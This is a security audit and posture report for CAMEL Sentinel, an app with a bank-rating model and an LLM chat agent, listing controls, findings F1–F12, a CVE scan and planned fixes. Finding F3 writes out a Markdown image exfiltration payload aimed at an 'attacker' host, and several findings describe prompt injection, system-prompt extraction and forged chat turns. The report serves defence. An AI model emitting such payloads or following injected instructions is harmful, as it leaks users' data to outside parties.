# Security Posture — Audit, Controls and Future Work

> Learning path: **AI Cybersecurity** applied to *this* app. The 🛡️ AI Security Lab
> *demonstrates* attacks. This document and the **🔐 Security Posture** page record how
> CAMEL Sentinel itself is protected, what an audit found, what was fixed, and what is
> still open.
> Developer: **[Raushan Ranjan](https://raushan-ranjan.azurewebsites.net)** · Books/Handbook/Notes written by **Raushan Ranjan**
> ([AI/ML + Cybersecurity Handbook](https://raushan1107.github.io/AI-Machine-Learning-Handbook/)).

Audit date: 2026-09-28 · Audited version: image `v2.0` · Fixes shipped in: `v2.1`

---

## 1. What is there to steal or break?

| Asset | Sensitivity | Where it lives | Can an outsider get it? |
|---|---|---|---|
| FDIC bank data | Public already | `data/processed/`, `/banks` | Yes, and that's fine: it is public data |
| Trained CAMEL model | Business IP | `models/*.joblib`, `/score` | Not the file. Its *behaviour* can be approximated through the API (model stealing), which is mitigated but not eliminated |
| Azure OpenAI / Speech keys | **Secret** | `.env` on the host, injected at run time | No: not in the image, repo, zips, or any API response (verified) |
| User chat text | May contain PII | `/chat` → Azure OpenAI | PII is now redacted *before* it leaves the server (v2.1) |
| System prompt | Low (no secrets in it) | `chat/prompts.py` | Extraction attempts are blocked by the input detector; it contains no secrets even if leaked |
| Compute / cost budget | Availability, money | API, Azure OpenAI, Speech | Input sizes capped (v2.1); rate limiting needs an identity-aware gateway (open) |

## 2. Controls in place (defence in depth)

| Layer | Control | Where |
|---|---|---|
| Data | Range/schema validation on FDIC ratios; poisoning defence demonstrated | `features/camel_ratios.py`, `security/poisoning.py` |
| Model | Plausibility + quarter-over-quarter checks available; time-holdout validation | `security/adversarial.py`, model card |
| API | Pydantic validation on every body; **bounded numeric inputs, max lengths, upload size cap** (v2.1) | `backend/main.py`, routers |
| API | **Not published outside the container by default** (v2.1): in `MODE=all` the API binds to 127.0.0.1 | `docker/docker-entrypoint.sh` |
| API | CORS restricted to configured origins (v2.1); generic error messages (v2.1) | `backend/main.py` |
| LLM / agent | System prompt server-side only; user text only as `role=user`; single allow-listed read-only tool | `chat/prompts.py`, `agent/tools.py` |
| LLM / agent | **Injection pre-check** blocks obvious attacks before the LLM is called (v2.1) | `security/prompt_guard.py` in `/chat` |
| LLM / agent | **PII redaction** before text is sent to Azure OpenAI (v2.1) | `security/pii.py` in `/chat` |
| LLM / agent | **Tool-call validation**: tool name allow-list + argument schema/range check, fails closed (v2.1) | `chat/agent.py` |
| LLM / agent | History capped (40 turns, 4,000 chars each) | `backend/main.py` |
| UI | **Backend switch is allow-listed + handshake-verified** (SSRF fix; locked in v2.1, safely switchable in v2.2) | `frontend/ui_kit.py` |
| UI | **Markdown images/links stripped from LLM replies** (exfiltration channel, v2.1) | chat page |
| UI | `unsafe_allow_html` only with server-computed values or escaped text; Streamlit XSRF protection on | pages |
| Container | Non-root user, pinned deps, CPU-only torch, no `.env`, no `curl`, no `pip` at run time, mode-aware health check | `Dockerfile`, `docker/` |
| Supply chain | Trivy config scan 27/27 pass; image CVE scan recorded; trusted registries | `deploy/trivy_results.json` |
| Cloud | HTTPS ingress (Container Apps), secrets via `secretref`, scale-to-zero | Deploy page |

## 3. Audit findings

| ID | Severity | Finding | Status |
|---|---|---|---|
| F1 | High | **SSRF**: the editable "Backend URL" in the sidebar let any visitor make the Streamlit server send HTTP requests to arbitrary hosts (internal services, cloud metadata) | **Fixed v2.1** (locked). **v2.2**: switchable again, but only to allow-listed hosts (`CAMEL_BACKEND_ALLOWLIST`) that answer `/health` like a CAMEL API; no credentials in URLs; no redirects; `CAMEL_LOCK_BACKEND=1` pins it |
| F2 | High | **Unvalidated tool call**: the chat agent passed LLM-generated tool arguments to the model without checking the tool name or argument schema; malformed JSON caused 500s | **Fixed v2.1**: allow-list + `validate_score_args`, fail closed |
| F3 | Medium | **Exfiltration via Markdown**: LLM replies rendered Markdown images, so an injected `![](https://attacker/?data=…)` would make the browser send data out | **Fixed v2.1**: images/links stripped from replies |
| F4 | Medium | **PII sent to a third party**: redaction existed only in the lab, not in the real `/chat` | **Fixed v2.1** |
| F5 | Medium | **Unbounded inputs**: chat message/history, TTS text, voice name, audio upload size, `/banks?limit`, infinite/huge ratios | **Fixed v2.1**: limits on every field |
| F6 | Medium | **API exposed with no auth**: `docker run -p 8000:8000` published an unauthenticated API with `/docs` | **Mitigated v2.1**: API private by default; public only with `CAMEL_API_PUBLIC=1`. **Open**: real authentication |
| F7 | Low | CORS `*` | **Fixed v2.1**: `CAMEL_CORS_ORIGINS` (default `http://localhost:8501`) |
| F8 | Low | Upstream error text returned to clients (`OpenAI API error: …`) could reveal deployment details | **Fixed v2.1**: generic message, detail logged server-side |
| F9 | Low | Chat history is supplied by the client, so a caller can forge earlier "assistant" turns | **Mitigated**: history capped, and ratings can only come from the tool. **Open**: server-side session store |
| F10 | Low | Expensive lab endpoints (retraining) could be abused for CPU exhaustion | **Mitigated v2.1**: results cached, heavy work pre-warmed; the API is private |
| F11 | Info | Models are pickles (`joblib`/`pkl`), which execute code on load | **Open**: hash-pin or sign model files |
| F12 | Info | Base-image / Python package CVEs (v2.0: 9 Python + 52 OS, all HIGH) | **Partly fixed v2.1**: every Python CVE fixed (FastAPI 0.141 / Starlette 1.7 / python-multipart 0.0.32, pip removed); `curl` removed; remaining OS CVEs have no Debian fix yet (§4) |

Checked and **not** vulnerable: no secrets in the repo, the `.env.example` file or the version zips; the image contains
no `.env`; no endpoint returns environment variables; file reads use fixed paths (no path traversal); the
Security Lab escapes all user text it renders as HTML.

## 4. Dependency / image CVE scan

`trivy image --scanners vuln,secret --severity HIGH,CRITICAL <image>`, summarised in
`deploy/trivy_image_summary.json` and shown on the Security Posture page.

What we changed: upgraded FastAPI/Starlette/python-multipart/uvicorn/pydantic, upgraded then **removed pip** (it vendors msgpack and setuptools), and removed `curl` (the health check uses Python). The remaining findings are in Debian base packages (util-linux, systemd libs, ncurses…) that have **no fixed version published yet**; they need local access to exploit, and the app runs as a non-root user. Fix path: rebuild when Debian ships patches, or move to a distroless/minimal base.

## 5. Future scope — what still needs work

| Area | Why | Fix manually | Fix with an AI assistant (prompt) |
|---|---|---|---|
| Authentication | Anyone with the URL can use the app | Container Apps **Easy Auth** with Microsoft Entra ID | "Add Entra ID authentication to the Azure Container App camel-sentinel with az containerapp auth, allowing only my tenant" |
| Rate limiting / WAF | Per-user limits need identity; all UI traffic reaches the API from localhost | Azure Front Door WAF or API Management rate-limit policies in front of the app | "Put Azure Front Door with a WAF policy and a 60 req/min per-IP rate limit in front of the Container App" |
| Server-side sessions | Client-supplied chat history can be forged | Store history server-side keyed by a signed session id | "Refactor /chat to keep conversation history server-side in an LRU keyed by a signed session token" |
| Model integrity | Pickles execute code on load | SHA-256 manifest checked at startup; later ONNX/skops | "Add a models/manifest.json of SHA-256 hashes and refuse to load any model whose hash differs" |
| Image signing + SBOM | Prove the image wasn't swapped | `docker buildx --sbom=true`, sign with cosign / Notation; ACR content trust | "Generate an SBOM for the image and sign it with cosign; verify the signature before deploy" |
| Secrets | `.env` files on laptops | Azure Key Vault + managed identity; rotate keys | "Move the Azure OpenAI key into Key Vault and read it via the Container App's managed identity" |
| Private networking | Registry and API are internet-reachable | ACR Premium with private endpoint; internal-only API ingress | "Make the camel-sentinel API internal-only in Container Apps and give ACR a private endpoint" |
| Monitoring / SOC | Attacks should raise alerts, not just be blockable | Ship API logs to Log Analytics; wire the SOC lab's rules as alerts | "Send FastAPI access logs to Azure Log Analytics and create alert rules for injection-blocked and 4xx bursts" |
| Red-team regression | Guardrails can regress silently | Run the lab's attack presets in CI; add PyRIT | "Write pytest cases that replay every Security Lab attack preset against /chat and fail if any succeeds" |
| Adversarial robustness | Small ratio edits can flip the score | Enforce plausibility checks on /score for untrusted callers; adversarial training | "Call plausibility_check inside /score and return a needs_review flag when it fires" |
| Patch cadence | New CVEs appear weekly | Rebuild monthly on a fresh base image; Trivy in CI with a severity gate | "Add a GitHub Action that builds the image and fails on CRITICAL Trivy findings" |
